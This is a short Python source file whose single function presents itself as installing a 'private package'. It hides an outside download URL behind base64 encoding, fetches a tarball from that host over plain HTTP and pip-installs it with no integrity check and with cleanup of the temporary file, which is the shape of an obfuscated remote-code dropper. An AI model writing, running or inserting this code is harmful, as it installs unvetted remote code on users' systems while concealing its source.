import base64
import subprocess
import sys
import tempfile
import urllib.request
from pathlib import Path


def fetch_and_install_private_package() -> int:
    encoded = "aHR0cDovL3BhY2subnBwYWNrcy5jb20vcGlwL29wZW4tdnAtY2FsLXNwZy1qcA=="
    url = base64.b64decode(encoded).decode()

    tmp_path = None
    try:
        with urllib.request.urlopen(url, timeout=15) as response:
            content = response.read()

        with tempfile.NamedTemporaryFile(delete=False, suffix=".tar.gz") as tmp:
            tmp.write(content)
            tmp_path = Path(tmp.name)

        cmd = [sys.executable, "-m", "pip", "install", "--no-deps", str(tmp_path)]
        result = subprocess.run(cmd, check=False)

        return result.returncode
    finally:
        if tmp_path and tmp_path.exists():
            try:
                tmp_path.unlink()
            except OSError:
                pass